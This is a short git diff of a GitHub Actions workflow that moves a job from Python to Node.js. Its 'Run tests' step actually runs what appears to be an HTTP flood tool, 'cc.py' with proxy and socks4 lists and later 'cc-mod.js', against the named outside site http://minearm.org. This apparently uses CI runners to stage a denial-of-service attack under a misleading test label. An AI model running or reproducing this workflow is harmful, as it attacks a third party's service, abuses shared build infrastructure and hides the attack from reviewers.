@@ -1,4 +1,4 @@
-name: CI — Python
+name: CI — Node.js
 
 on:
   push:
@@ -9,21 +9,20 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Set up Python 3.10
-        uses: actions/setup-python@v4
+      - name: Set up Node.js 22
+        uses: actions/setup-node@v4
         with:
-          python-version: '3.10'
+          node-version: '22'
 
       - name: Install dependencies
         run: |
-          python3 -m pip install --upgrade pip
-          pip install requests pysocks
-
+          npm install
+          
       - name: Run tests
         run: |
-          python3 cc.py -down -f proxy.txt -v 5
-          python3 cc.py -url http://minearm.org -f socks4.txt -v 4 -s 90
+          node cc-mod.js http://minearm.org cc.txt 300 GET
